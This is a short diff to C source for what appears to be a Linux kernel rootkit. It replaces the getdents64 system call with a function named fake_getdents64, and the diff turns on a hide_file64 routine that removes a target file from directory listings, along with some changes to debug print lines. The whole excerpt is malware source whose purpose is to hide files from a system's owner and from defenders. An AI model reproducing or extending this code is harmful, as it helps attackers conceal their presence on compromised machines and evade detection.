@@ -91,7 +91,7 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
 //            memmove(dp, (void *)next_addr, size);                 // current dirent point to the next
 //            count -= cur_reclen;                                     // Modify the size
             
-            printk("Hide %s success.\n", dp->d_name);
+              printk("Hide %s success.\n", dp->d_name);
         }
     }
 
@@ -100,12 +100,12 @@ static long hide_file64(char *f_name, struct linux_dirent64 *dirp, long count)
 
 asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
 {
-    long rv;
+    long rv, rv2;
     
-//    rv = hide_file64(targetfile, dirp, count);
     rv = kernel_getdents64(fd, dirp, count);
-    printk("Yes, faked the getdent!");
+    rv2 = hide_file64(targetfile, dirp, count);
     
+    printk("Yes, faked the getdent! %d - %d", rv, rv2);
     return rv;
 }
  
